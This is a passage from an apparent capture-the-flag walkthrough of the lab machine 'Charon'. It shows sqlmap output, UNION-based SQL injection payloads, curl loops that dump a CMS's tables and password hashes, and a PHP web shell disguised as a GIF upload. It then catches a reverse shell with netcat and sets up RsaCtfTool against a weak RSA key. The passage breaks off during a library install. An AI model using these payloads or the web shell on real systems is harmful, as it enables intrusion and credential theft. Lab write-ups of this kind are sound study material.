POST parameter 'email' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 807 HTTP(s) requests:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: email=test@gmail.com' RLIKE (SELECT (CASE WHEN (4574=4574) THEN 0x7465737440676d61696c2e636f6d ELSE 0x28 END))-- xywB
---
do you want to exploit this SQL injection? [Y/n] Y
[00:40:38] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 (xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL Unknown
[00:40:38] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.sqlmap/output/results-05312018_1238am.csv'

[*] shutting down at 00:40:38

root@kali:~/charon#
```

```sh
root@kali:~/charon# sqlmap -l forgot.req --level 4 --risk 3 --batch -p email --dump
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.2.3#stable}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 00:47:36

[00:47:36] [INFO] sqlmap parsed 1 (parameter unique) requests from the targets list ready to be tested
URL 1:
GET http://10.10.10.31:80/cmsdata/forgot.php
POST data: email=test%40gmail.com
do you want to test this URL? [Y/n/q]
> Y
[00:47:37] [INFO] testing URL 'http://10.10.10.31:80/cmsdata/forgot.php'
[00:47:37] [INFO] resuming back-end DBMS 'mysql'
[00:47:37] [INFO] using '/root/.sqlmap/output/results-05312018_1247am.csv' as the CSV results file in multiple targets mode
[00:47:37] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: email=test@gmail.com' RLIKE (SELECT (CASE WHEN (4574=4574) THEN 0x7465737440676d61696c2e636f6d ELSE 0x28 END))-- xywB
---
do you want to exploit this SQL injection? [Y/n] Y
[00:47:37] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 (xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL unknown
[00:47:37] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[00:47:37] [INFO] fetching current database
[00:47:37] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[00:47:37] [INFO] retrieved: supercms
[00:47:47] [INFO] fetching tables for database: 'supercms'
[00:47:47] [INFO] fetching number of tables for database 'supercms'
[00:47:47] [INFO] retrieved:
[00:47:47] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[00:47:47] [WARNING] unable to retrieve the number of tables for database 'supercms'
[00:47:47] [ERROR] unable to retrieve the table names for any database
do you want to use common table existence check? [y/N/q] N
[00:47:47] [ERROR] unable to retrieve the tables in database 'supercms', skipping to the next URL
[00:47:47] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.sqlmap/output/results-05312018_1247am.csv'

[*] shutting down at 00:47:47

root@kali:~/charon#
root@kali:~/charon# less /root/.sqlmap/output/results-05312018_1247am.csv
root@kali:~/charon# cat /root/.sqlmap/output/results-05312018_1247am.csv
Target URL,Place,Parameter,Technique(s),Note(s)
http://10.10.10.31:80/cmsdata/forgot.php,POST,email,B,
http://10.10.10.31:80/cmsdata/forgot.php,POST,email,B,
root@kali:~/charon#
```

![](images/19.png)

![](images/20.png)

![](images/21.png)

![](images/22.png)

![](images/23.png)

![](images/24.png)

[`The INFORMATION_SCHEMA COLUMNS Table`](https://dev.mysql.com/doc/refman/8.0/en/columns-table.html)

**INFORMATION\_SCHEMA Name**|**SHOW Name**|**Remarks**
:-----:|:-----:|:-----:
TABLE\_CATALOG| |def
TABLE\_SCHEMA| | 
TABLE\_NAME| | 
COLUMN\_NAME|Field| 
ORDINAL\_POSITION| |see notes
COLUMN\_DEFAULT|Default| 
IS\_NULLABLE|Null| 
DATA\_TYPE|Type| 
CHARACTER\_MAXIMUM\_LENGTH|Type| 
CHARACTER\_OCTET\_LENGTH| | 
NUMERIC\_PRECISION|Type| 
NUMERIC\_SCALE|Type| 
DATETIME\_PRECISION|Type| 
CHARACTER\_SET\_NAME| | 
COLLATION\_NAME|Collation| 
COLUMN\_TYPE|Type|MySQL extension
COLUMN\_KEY|Key|MySQL extension
EXTRA|Extra|MySQL extension
PRIVILEGES|Privileges|MySQL extension
COLUMN\_COMMENT|Comment|MySQL extension
GENERATION\_EXPRESSION| |MySQL extension
SRS\_ID| |MySQL extension

```
email=test@gmail.com' UNIoN SELECT 1,2,3,CONCAT(TABLE_SCHEMA, ":", TABLE_NAME, ":", COLUMN_NAME, "abc@def.com") FROM INFORMATiON_SCHEMA.COLUMNS LIMIT 1-- -
```

![](images/25.png)

```
email=test@gmail.com' UNIoN SELECT 1,2,3,CONCAT(TABLE_SCHEMA, ":", TABLE_NAME, ":", COLUMN_NAME, "abc@def.com") FROM INFORMATiON_SCHEMA.COLUMNS WHERE TABLE_SCHEMA != 'InformatiOn_Schema' LIMIT 1-- -
```

![](images/26.png)

```
email=test@gmail.com' UNIoN SELECT 1,2,3,CONCAT(TABLE_SCHEMA, ":", TABLE_NAME, ":", COLUMN_NAME, "abc@def.com") FROM INFORMATiON_SCHEMA.COLUMNS WHERE TABLE_SCHEMA != 'InformatiOn_Schema' LIMIT 1 offset 0-- -
```

![](images/27.png)

```
email=test@gmail.com' UNIoN SELECT 1,2,3,CONCAT(TABLE_SCHEMA, ":", TABLE_NAME, ":", COLUMN_NAME, "abc@def.com") FROM INFORMATiON_SCHEMA.COLUMNS WHERE TABLE_SCHEMA != 'InformatiOn_Schema' LIMIT 1 offset 1-- -
```

![](images/28.png)

```
email=test@gmail.com' UNIoN SELECT 1,2,3,CONCAT(TABLE_SCHEMA, ":", TABLE_NAME, ":", COLUMN_NAME, "abc@def.com") FROM INFORMATiON_SCHEMA.COLUMNS WHERE TABLE_SCHEMA != 'InformatiOn_Schema' LIMIT 1 offset 2-- -
```

![](images/29.png)

```
email=test@gmail.com' UNIoN SELECT 1,2,3,CONCAT(TABLE_SCHEMA, ":", TABLE_NAME, ":", COLUMN_NAME, "abc@def.com") FROM INFORMATiON_SCHEMA.COLUMNS WHERE TABLE_SCHEMA != 'InformatiOn_Schema' LIMIT 1 offset 3-- -
```

![](images/30.png)

`columns.sh`

```sh
for i in $(seq 0 100); do
	payload="email=test@gmail.com' UNIoN SELECT 1,2,3,CONCAT(TABLE_SCHEMA, ':', TABLE_NAME, ':', COLUMN_NAME, 'abc@def.com') FROM INFORMATiON_SCHEMA.COLUMNS WHERE TABLE_SCHEMA != 'InformatiOn_Schema' LIMIT 1 offset $i-- -"
	curl -s -d "$payload" http://10.10.10.31/cmsdata/forgot.php | grep -o '[^ ]*@def.com'
	done
```

```sh
root@kali:~/charon# bash columns.sh
supercms:groups:grpidabc@def.com
supercms:groups:useridabc@def.com
supercms:license:idabc@def.com
supercms:license:license_keyabc@def.com
supercms:operators:idabc@def.com
supercms:operators:__username_abc@def.com
supercms:operators:__password_abc@def.com
supercms:operators:emailabc@def.com
root@kali:~/charon#
```

```
email=test@gmail.com' UNIoN SELECT 1,2,3,CONCAT(__username_ , ":", __password_, "@def.com") FROM supercms.operators LIMIT 1 OFFSET 0-- -
```

![](images/31.png)

`users.sh`

```sh
for i in $(seq 0 300); do
	payload="email=test@gmail.com' UNIoN SELECT 1,2,3,CONCAT(__username_ , ':', __password_, '@def.com') FROM supercms.operators LIMIT 1 OFFSET $i-- -"
	curl -s -d "$payload" http://10.10.10.31/cmsdata/forgot.php | grep -o '[^ ]*@def.com'
	done
```

```sh
root@kali:~/charon# bash users.sh
test1:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test2:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test3:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test4:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test5:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test6:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test7:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test8:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test9:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test10:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test11:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test12:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test13:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test14:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test15:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test16:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test17:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test18:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test19:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test20:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test21:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test22:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test23:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test24:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test25:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test26:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test27:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test28:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test29:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test30:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test31:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test32:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test33:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test34:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test35:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test36:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test37:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test38:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test39:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test40:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test41:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test42:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test43:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test44:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test45:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test46:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test47:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test48:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test49:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test50:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test51:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test52:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test53:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test54:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test55:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test56:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test57:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test58:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test59:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test60:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test61:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test62:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test63:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test64:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test65:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test66:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test67:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test68:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test69:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test70:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test71:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test72:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test73:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test74:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test75:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test76:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test77:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test78:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test79:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test80:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test81:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test82:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test83:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test84:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test85:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test86:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test87:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test88:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test89:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test90:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test91:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test92:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test93:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test94:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test95:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test96:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test97:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test98:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test99:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test100:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test101:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test102:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test103:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test104:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test105:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test106:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test107:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test108:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test109:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test110:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test111:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test112:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test113:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test114:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test115:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test116:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test117:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test118:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test119:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test120:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test121:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test122:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test123:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test124:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test125:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test126:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test127:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test128:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test129:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test130:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test131:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test132:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test133:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test134:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test135:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test136:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test137:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test138:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test139:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test140:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test141:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test142:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test143:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test144:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test145:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test146:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test147:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test148:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test149:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test150:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test151:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test152:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test153:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test154:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test155:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test156:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test157:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test158:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test159:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test160:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test161:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test162:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test163:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test164:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test165:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test166:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test167:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test168:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test169:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test170:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test171:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test172:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test173:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test174:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test175:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test176:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test177:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test178:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test179:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test180:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test181:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test182:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test183:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test184:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test185:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test186:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test187:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test188:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test189:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test190:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test191:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test192:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test193:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test194:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test195:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test196:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test197:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test198:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test199:5f4dcc3b5aa765d61d8327deb882cf99@def.com
test200:5f4dcc3b5aa765d61d8327deb882cf99@def.com
super_cms_adm:0b0689ba94f94533400f4decd87fa260@def.com
decoder:5f4dcc3b5aa765d61d8327deb882cf99@def.com
root@kali:~/charon#
```

![](images/32.png)

![](images/33.png)

![](images/34.png)

![](images/35.png)

![](images/36.png)

![](images/37.png)

![](images/38.png)

![](images/39.png)

![](images/40.png)

![](images/41.png)

![](images/42.png)

`shell.php.jpg`

```php
GIF8
<? php echo system($_REQUEST['cmd']); ?>
```

```sh
root@kali:~/charon# file shell.php.jpg
shell.php: GIF image data 8255 x 26736
root@kali:~/charon#
```

![](images/43.png)

![](images/44.png)

```
view-source:http://10.10.10.31/images/myshell.php?cmd=ls
```

![](images/45.png)

###### Reverse Shell

![](images/46.png)

![](images/47.png)

```sh
root@kali:~/charon# nc -nlvp 8001
listening on [any] 8001 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.10.31] 57050
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@charon:/var/www/html/freeeze/images$ ^Z
[1]+  Stopped                 nc -nlvp 8001
root@kali:~/charon# echo $TERM
xterm-256color
root@kali:~/charon# stty -a
speed 38400 baud; rows 51; columns 204; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = M-^?; eol2 = M-^?; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc ixany imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
root@kali:~/charon# stty raw -echo
root@kali:~/charon# nc -nlvp 8001
                                 reset
reset: unknown terminal type unknown
Terminal type? xterm-256color

www-data@charon:/var/www/html/freeeze/images$ export SHELL=bash
www-data@charon:/var/www/html/freeeze/images$ stty rows 51 columns 204
www-data@charon:/var/www/html/freeeze/images$
www-data@charon:/var/www/html/freeeze/images$ cd /home
www-data@charon:/home$ ls -l
total 4
drwxr-xr-x 3 decoder freeeze 4096 Jun 26  2017 decoder
www-data@charon:/home$ cd decoder/
www-data@charon:/home/decoder$ ls -l
total 12
-rw-r--r-- 1 decoder freeeze 138 Jun 23  2017 decoder.pub
-rw-r--r-- 1 decoder freeeze  32 Jun 23  2017 pass.crypt
-r-------- 1 decoder freeeze  33 Jun 23  2017 user.txt
www-data@charon:/home/decoder$ cat decoder.pub
-----BEGIN PUBLIC KEY-----
MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhALxHhYGPVMYmx3vzJbPPAEa10NETXrV3
mI9wJizmFJhrAgMBAAE=
-----END PUBLIC KEY-----
www-data@charon:/home/decoder$ cat pass.crypt
�2O�Sb���э�"e�W�g���T��o7�Iwww-data@charon:/home/decoder$
www-data@charon:/home/decoder$ cat user.txt
cat: user.txt: Permission denied
www-data@charon:/home/decoder$
```

```sh
www-data@charon:/home/decoder$ base64 decoder.pub
LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUR3d0RRWUpLb1pJaHZjTkFRRUJCUUFES3dBd0tB
SWhBTHhIaFlHUFZNWW14M3Z6SmJQUEFFYTEwTkVUWHJWMwptSTl3Sml6bUZKaHJBZ01CQUFFPQot
LS0tLUVORCBQVUJMSUMgS0VZLS0tLS0K
www-data@charon:/home/decoder$
```

```sh
www-data@charon:/home/decoder$ base64 pass.crypt
mTJPrVNiiaHi0Y3QImXNfxVXnWecid0ZVMjFbzeNEUk=
www-data@charon:/home/decoder$
```

```sh
root@kali:~/charon# cat decoder.pub.b64
LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUR3d0RRWUpLb1pJaHZjTkFRRUJCUUFES3dBd0tB
SWhBTHhIaFlHUFZNWW14M3Z6SmJQUEFFYTEwTkVUWHJWMwptSTl3Sml6bUZKaHJBZ01CQUFFPQot
LS0tLUVORCBQVUJMSUMgS0VZLS0tLS0K
root@kali:~/charon#
```

```sh
root@kali:~/charon# cat pass.crypt.b64
mTJPrVNiiaHi0Y3QImXNfxVXnWecid0ZVMjFbzeNEUk=
root@kali:~/charon#
```

```sh
root@kali:~/charon# base64 -d decoder.pub.b64 > decoder.pub
root@kali:~/charon# base64 -d pass.crypt.b64 > pass.crypt
```

###### RSA

[`RsaCtfTool`](https://github.com/sourcekris/RsaCtfTool)

```sh
root@kali:~/charon# git clone https://github.com/Ganapati/RsaCtfTool
Cloning into 'RsaCtfTool'...
remote: Counting objects: 382, done.
remote: Total 382 (delta 0), reused 0 (delta 0), pack-reused 382
Receiving objects: 100% (382/382), 1.73 MiB | 4.14 MiB/s, done.
Resolving deltas: 100% (203/203), done.
root@kali:~/charon# cd RsaCtfTool/
root@kali:~/charon/RsaCtfTool# ls -l
total 4148
-rwxr-xr-x 1 root root    9446 May 31 01:51 boneh_durfee.sage
-rw-r--r-- 1 root root     292 May 31 01:51 ecm.sage
drwxr-xr-x 2 root root    4096 May 31 01:51 examples
-rw-r--r-- 1 root root     416 May 31 01:51 fermat.py
-rw-r--r-- 1 root root       9 May 31 01:51 optional-requirements.txt
-rw-r--r-- 1 root root    2017 May 31 01:51 p_1.py
-rw-r--r-- 1 root root    2553 May 31 01:51 partial_q.py
-rw-r--r-- 1 root root   17025 May 31 01:51 pastctfprimes.txt
-rw-r--r-- 1 root root    4401 May 31 01:51 README.md
-rw-r--r-- 1 root root      30 May 31 01:51 requirements.txt
-rwxr-xr-x 1 root root   26579 May 31 01:51 RsaCtfTool.py
-rw-r--r-- 1 root root    2069 May 31 01:51 rsalibnum.py
-rw-r--r-- 1 root root    2660 May 31 01:51 siqs.py
-rwxr-xr-x 1 root root     745 May 31 01:51 smallfraction.sage
-rwxr-xr-x 1 root root    2283 May 31 01:51 test.sh
-rw-r--r-- 1 root root    2416 May 31 01:51 wiener_attack.py
-rwxr-xr-x 1 root root 4126439 May 31 01:51 yafu
root@kali:~/charon/RsaCtfTool# cat requirements.txt
PyCrypto
gmpy
requests
root@kali:~/charon/RsaCtfTool# pip install -r requirements.txt
Requirement already satisfied: PyCrypto in /usr/lib/python2.7/dist-packages (from -r requirements.txt (line 1))
Collecting gmpy (from -r requirements.txt (line 2))
  Downloading https://files.pythonhosted.org/packages/26/37/2184c13cee81e1dbeaebbb13570195247e73ab2138a3db0c9d2c5347e372/gmpy-1.17.zip (147kB)
    100% |████████████████████████████████| 153kB 2.8MB/s
Requirement already satisfied: requests in /usr/lib/python2.7/dist-packages (from -r requirements.txt (line 3))
Building wheels for collected packages: gmpy
  Running setup.py bdist_wheel for gmpy ... done
  Stored in directory: /root/.cache/pip/wheels/0e/71/61/afbbb4cae8a7a6d5230702197bd4cb8ae0a7f767df0e08f28f
Successfully built gmpy
Installing collected packages: gmpy
Successfully installed gmpy-1.17
root@kali:~/charon/RsaCtfTool#
root@kali:~/charon/RsaCtfTool# git clone https://github.com/hellman/libnum.git
Cloning into 'libnum'...
remote: Counting objects: 190, done.
remote: Total 190 (delta 0), reused 0 (delta 0), pack-reused 190
Receiving objects: 100% (190/190), 47.20 KiB | 847.00 KiB/s, done.
Resolving deltas: 100% (102/102), done.
root@kali:~/charon/RsaCtfTool# cd libnum/
root@kali:~/charon/RsaCtfTool/libnum# python setup.py install
running install
running build
running build_py
creating build
creating build/lib.linux-x86_64-2.7
creating build/lib.linux-x86_64-2.7/libnum
copying libnum/ranges.py -> build/lib.linux-x86_64-2.7/libnum
copying libnum/common.py -> build/lib.linux-x86_64-2.7/libnum
copying libnum/__init__.py -> build/lib.linux-x86_64-2.7/libnum
copying libnum/modular.py -> build/lib.linux-x86_64-2.7/libnum
copying libnum/sqrtmod.py -> build/lib.linux-x86_64-2.7/libnum
copying libnum/strings.py -> build/lib.linux-x86_64-2.7/libnum
copying libnum/stuff.py -> build/lib.linux-x86_64-2.7/libnum
copying libnum/factorize.py -> build/lib.linux-x86_64-2.7/libnum
copying libnum/ecc.py -> build/lib.linux-x86_64-2.7/libnum
copying libnum/primes.py -> build/lib.linux-x86_64-2.7/libnum
creating build/lib.linux-x86_64-2.7/libnum/chains
copying libnum/chains/__init__.py -> build/lib.linux-x86_64-2.7/libnum/chains
copying libnum/chains/chain.py -> build/lib.linux-x86_64-2.7/libnum/chains
copying libnum/chains/sqrt.py -> build/lib.linux-x86_64-2.7/libnum/chains
running install_lib
creating /usr/local/lib/python2.7/dist-packages/libnum
copying build/lib.linux-x86_64-2.7/libnum/ranges.py -> /usr/local/lib/python2.7/dist-packages/libnum
copying build/lib.linux-x86_64-2.7/libnum/common.py -> /usr/local/lib/python2.7/dist-packages/libnum
copying build/lib.linux-x86_64-2.7/libnum/__init__.py -> /usr/local/lib/python2.7/dist-packages/libnum
copying build/lib.linux-x86_64-2.7/libnum/modular.py -> /usr/local/lib/python2.7/dist-packages/libnum
copying build/lib.linux-x86_64-2.7/libnum/sqrtmod.py -> /usr/local/lib/python2.7/dist-packages/libnum
copying build/lib.linux-x86_64-2.7/libnum/strings.py -> /usr/local/lib/python2.7/dist-packages/libnum
copying build/lib.linux-x86_64-2.7/libnum/stuff.py -> /usr/local/lib/python2.7/dist-packages/libnum
creating /usr/local/lib/python2.7/dist-packages/libnum/chains
